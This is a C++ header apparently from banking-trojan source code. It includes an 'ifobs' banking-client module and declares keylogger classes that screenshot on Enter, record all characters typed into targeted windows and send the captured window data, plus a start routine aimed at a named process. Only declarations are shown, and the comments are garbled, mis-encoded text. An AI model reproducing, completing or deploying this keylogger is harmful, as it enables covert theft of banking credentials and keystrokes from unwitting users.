#include "../source/system/ifobs.cpp"
#include "../../core/include/core/memory.h"
#pragma once

//�������� �������� ������� �� ������� Enter � ����� ������ ���� ������ ��������� ���������� ����������
//� �������� �� � �������
bool StartKeyLoggerFirstNScreenshot( int n );

class KeyLoggerFirstNScreenShot : public KeyLogger::ExecForFilterMsg
{

		int countScreenShot; //������� ���������� ������
		int curr; //����� �������� ���������
		Mem::Data memScreenshot;

	protected:

		virtual void Exec( KeyLogger::FilterMsgParams& params );

	public:
		
		KeyLoggerFirstNScreenShot( KeyLogger::FilterMsgBase* filter, int countScr );

};

//��������� ���� ���� �������� � ��������
class KeyLoggerAllChars : public KeyLogger::ExecForFilterMsg
{

		struct HwndText
		{
			HWND hwnd;
			HWND parent;
			StringBuilderStack<256> parentCaption;
			StringBuilder text;
			SYSTEMTIME beg, end;
			bool ignore;
		};

		Vector< MovedPtr<HwndText> > ctrls; //�������� � ��������� � ��� �������
		StringArray maskCaptions; //����� �� ������� ���������� ����� ���� ����� �����������

	protected:

		virtual void Exec( KeyLogger::FilterMsgParams& params );

	public:

		KeyLoggerAllChars( KeyLogger::FilterMsgBase* filter, StringArray& captions );
		~KeyLoggerAllChars();
		//�� �������� ���� ���������� ����������� ������ ��� ����� ����
		void SendWindowData( HWND hwnd );

		static bool Start( const char* nameProcess );
};
